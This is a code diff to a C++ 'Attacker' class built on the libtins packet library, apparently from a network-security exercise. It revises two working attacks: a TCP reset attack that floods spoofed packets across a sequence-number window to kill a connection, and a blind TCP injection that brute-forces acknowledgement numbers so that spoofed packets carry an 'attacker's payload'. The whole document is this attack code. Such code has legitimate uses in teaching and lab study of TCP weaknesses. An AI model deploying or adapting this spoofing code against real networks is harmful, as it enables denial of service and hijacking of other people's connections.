@@ -5,12 +5,9 @@
 using namespace Tins;
 
 void Attacker::TCP_dos() {
-    std::cout << "^.^.^ Reset TCP connection ^.^.^" << std::endl;
-
     PacketSender sender;
-    /* Increased success rate */
-    for (uint32_t i = 0; i < seq_window_size; ++i) {
-        uint32_t seq = seq_in_window - i;
+    for (int i = -seq_in_window; i < seq_window_size; ++i) {
+        uint32_t seq = seq_in_window + i;
 
         IP packet = IP(server_ip, client_ip) / TCP(server_port, client_port);
         TCP &tcp = packet.rfind_pdu<TCP>();
@@ -19,23 +16,30 @@ void Attacker::TCP_dos() {
 
         sender.send(packet, send_if_name);
     }
+    std::cout << "^.^.^ Reset TCP connection ^.^.^" << std::endl;
 }
 
+
 void Attacker::TCP_inject() {
-    std::cout << "^.^.^ Inject data into TCP connection ^.^.^" << std::endl;
-
     PacketSender sender;
-    std::string payload = " "; // Adjust payload as needed
+    std::string payload = " The attacker's payload ";
     
-    for (uint32_t i = 0; i < seq_window_size; ++i) {
-        uint32_t seq = seq_in_window - i;
+    for (int i = 0; i < 1; ++i) {
+        for(int j=0; j<65535; ++j){
+            int64_t seq_t = seq_in_window + i;
+            int64_t ack_t = ack_in_window + j*ack_window_size;
+            uint32_t seq = static_cast<uint32_t>(seq_t);
+            uint32_t ack = static_cast<uint32_t>(ack_t);
 
-        IP packet = IP(client_ip, server_ip) / TCP(client_port, server_port) / RawPDU(payload);
-        TCP &tcp = packet.rfind_pdu<TCP>();
-        tcp.set_flag(TCP::ACK, true);
-        tcp.seq(seq);
-        tcp.ack_seq(ack_in_window);
 
-        sender.send(packet, send_if_name);
+            IP packet = IP(server_ip, client_ip) / TCP(server_port, client_port) / RawPDU(payload);
+            TCP &tcp = packet.rfind_pdu<TCP>();
+            tcp.set_flag(TCP::ACK, true);
+            tcp.seq(seq);
+            tcp.ack_seq(ack);
+
+            sender.send(packet, send_if_name);
+        }
     }
+    std::cout << "^.^.^ Inject data into TCP connection ^.^.^" << std::endl;
 }
